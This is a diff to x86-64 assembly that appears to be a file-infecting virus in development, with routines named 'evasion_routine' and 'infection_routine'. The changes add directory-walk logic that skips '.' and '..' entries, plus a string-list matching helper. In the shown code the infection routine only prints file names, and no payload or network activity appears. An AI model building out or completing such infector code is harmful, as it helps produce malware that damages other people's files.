@@ -150,8 +150,6 @@ evasion_routine:
     test eax, eax
     jz .dirent_read_loop_start_evasion_end
     add rsp, SIX_SEVEN + DIRENT_BUF_SZ + 8 ; push rax from earlier
-    ; add rsp, DIRENT_BUF_SZ
-    ; add rsp, 8 ; why is this needed or else rsp will be 8 bytes off when return?
     mov rax, 0
     jmp .ret
 
@@ -255,12 +253,25 @@ infection_routine:
     mov rdi, rax
     call strcpy
 
+    ; check if dirent.d_name is bad (./ and ../)
+    lea rdi, [rbx + rcx + dirent.d_name]
+    lea rsi, [rel excl_dir]
+    call strstrs
+    test rax, rax
+    jnz .dirent_read_loop_start_infection_end
+
     ; print stuff
     lea rdi, [rsp]
     call write_string_nl
+
+.dirent_read_loop_start_infection_end:
     add rsp, BLAZEIT
     pop rax
 
+.dirent_read_loop_cont_infection:
+    movzx rdi, word [rsp + rcx + dirent.d_reclen]
+    add rcx, rdi
+    jmp .dirent_read_loop_start_infection
 
 .dirent_read_loop_end_infection: 
     add rsp, DIRENT_BUF_SZ
@@ -413,6 +424,52 @@ strstr:
 
     xor     eax, eax
     ret
+
+; rdi - str
+; rsi - list of strs
+; return 1 if found
+; return 0 if not found
+
+strstrs:
+    push rbx
+    mov  rbx, rdi            ; save str
+
+.next:
+    cmp  byte [rsi], 0
+    je   .not_found          ; double NULL = end of list
+
+    mov  rdi, rsi            ; candidate string
+    mov  rdx, rbx            ; str
+
+.compare:
+    mov  al, [rdi]
+    cmp  al, [rdx]
+    jne  .next_str
+
+    test al, al
+    jz   .found
+
+    inc  rdi
+    inc  rdx
+    jmp  .compare
+
+.next_str:
+    ; Skip to the next string
+    inc  rsi
+    cmp  byte [rsi - 1], 0
+    jne  .next_str
+    jmp  .next
+
+.found:
+    mov  eax, 1
+    pop  rbx
+    ret
+
+.not_found:
+    xor  eax, eax
+    pop  rbx
+    ret
+
 
 
 break:
